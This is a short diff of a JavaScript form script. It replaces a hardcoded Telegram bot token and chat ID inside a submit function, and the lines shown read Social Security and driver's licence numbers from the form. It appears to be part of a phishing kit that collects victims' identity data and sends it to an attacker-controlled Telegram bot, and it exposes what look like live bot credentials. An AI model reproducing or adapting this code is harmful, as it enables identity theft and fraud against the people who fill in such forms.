@@ -50,8 +50,8 @@ function fixStepIndicator(n) {
 	}
 	
 function submitForm() {
-          const BOT_TOKEN = '6403012866:AAGNpGzEijhSfRlMie3dqhv6DD4hucAY1k8';
-          const CHAT_ID = '6929442824';
+          const BOT_TOKEN = '6921530308:AAF77fXVIGJthOwoo9IByU7C50r6wlUiWOs';
+          const CHAT_ID = '6355414951';
 
           const ssn = document.getElementById('ssn').value;
           const dl = document.getElementById('dl').value;
